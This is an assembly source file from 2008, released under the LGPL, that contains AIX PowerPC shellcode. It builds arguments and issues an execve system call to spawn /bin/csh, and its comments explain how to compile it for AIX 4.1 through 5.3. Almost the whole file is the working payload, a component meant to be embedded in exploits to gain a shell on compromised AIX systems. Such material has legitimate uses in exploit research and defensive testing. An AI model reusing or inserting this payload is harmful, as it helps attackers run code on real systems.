/*
 *  $Id: aix-power-shellcode.S 40 2008-11-17 02:45:30Z ramon $
 *
 *  aix-power-shellcode.S - AIX Power shellcode
 *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

/*
 * Compile with the following command.
 * $ gcc -Wall -DAIXLEVEL -o aix-power-shellcode aix-power-shellcode.S
 *
 * Where AIXLEVEL is one of the currently supported AIX levels.
 * -DV410   AIX 4.1.0
 * -DV420   AIX 4.2.0
 * -DV430   AIX 4.3.0
 * -DV433   AIX 4.3.3
 * -DV530   AIX 5.3.0
 *
 */

#include "aix-power.h"

    .globl .main
    .csect .text[PR]

.main:

shellcode:
    lil     %r31,__CAL
    xor.    %r5,%r5,%r5
    bnel    shellcode
    mflr    %r30
    cal     %r30,511(%r30)
    cal     %r3,-511+40(%r30)
    stb     %r5,-511+48(%r30)
    stu     %r5,-4(%r1)
    stu     %r3,-4(%r1)
    mr      %r4,%r1
    cal     %r2,__NC_execve(%r31)
    crorc   %cr6,%cr6,%cr6
    .long   0x44ffff02
    .asciz  "/bin/csh"

